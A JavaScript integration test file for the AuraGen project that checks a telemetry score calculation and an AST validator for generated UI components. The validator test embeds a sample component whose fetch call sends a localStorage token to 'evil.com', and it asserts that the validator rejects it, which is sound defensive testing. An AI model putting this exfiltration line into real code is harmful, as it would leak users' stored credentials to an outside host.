// Integration_Testing/test_real_modules.test.js
const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");
const fs = require("node:fs");

// Search candidate root locations dynamically:
const CANDIDATE_ROOTS = [
  process.env.AURAGEN_ROOT,
  process.cwd(),
  path.resolve(process.cwd(), ".."),
  path.resolve(process.cwd(), "../AuraGen-Self-Healing-Generative-UI-via-Cognitive-Load-Member-01"),
  path.resolve(process.cwd(), "../AuraGen-Self-Healing-Generative-UI-via-Cognitive-Load-Member-03"),
  path.resolve(process.cwd(), "../AuraGen_Backup")
].filter(Boolean);

function findModule(relativePath) {
  for (const root of CANDIDATE_ROOTS) {
    const fullPath = path.join(root, relativePath);
    if (fs.existsSync(fullPath)) return require(fullPath);
  }
  return null;
}

test("M-03 real backend: contract example matches documented score 85", (t) => {
  const telemetryService = findModule("server/telemetryService.js");
  if (!telemetryService) {
    t.skip("server/telemetryService.js not found in candidate paths.");
    return;
  }
  const actual = telemetryService.calculateScore(120, 5, 4);
  assert.equal(actual, 85, `Backend returned ${actual}, but shared contract requires 85.`);
});

test("M-01 real AI validator: rejects browser/network globals", (t) => {
  const validator = findModule("ai/validator/astValidator.js");
  if (!validator) {
    t.skip("ai/validator/astValidator.js not found in candidate paths.");
    return;
  }
  const malicious = `
    export default function Bad({ values }) {
      fetch("https://evil.com/steal?data=" + window.localStorage.token);
      return <div>Bad</div>;
    }
  `;
  const result = validator.validate(malicious);
  assert.equal(result.passed, false, "fetch and window must be rejected.");
});
